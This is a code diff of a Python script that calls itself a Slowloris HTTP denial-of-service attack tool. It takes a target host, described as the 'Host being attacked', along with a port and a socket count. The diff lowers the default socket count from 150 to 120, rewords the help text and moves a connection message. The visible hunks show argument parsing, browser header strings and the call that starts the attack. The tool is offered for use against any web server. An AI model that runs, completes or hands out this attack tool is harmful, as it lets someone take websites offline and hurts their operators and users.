@@ -6,15 +6,15 @@ import sys
 
 parser = argparse.ArgumentParser(description="********** Slowloris HTTP DoS Attack by gunes **********")
 parser.add_argument('host', nargs="?", help="Host being attacked.")
-parser.add_argument('-p', '--port', default=80, help="Port of webserver, usually 80", type=int)
-parser.add_argument('-s', '--sockets', default=150, help="Number of sockets to use in the test", type=int)
+parser.add_argument('-p', '--port', default=80, help="Port Number(Web Server [HTTP] port is 80)", type=int)
+parser.add_argument('-s', '--sockets', default=120, help="Number of sockets", type=int)
 args = parser.parse_args()
 
 if len(sys.argv) <= 1:
     parser.print_help()
     sys.exit(1)
 
-print("Connecting to:", args.host, "on port:", args.port)
+
 
 headers = [
     "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
@@ -40,5 +40,7 @@ def connect(ip_address):
         print("An error occured while connecting to host", args.host + ":" + str(args.port)
         + "\n" , e)
 
+
+print("\n\nConnecting to:", args.host, "on port:", args.port, "with", args.sockets, "sockets.\n\n")
 
 connect(ip_address)
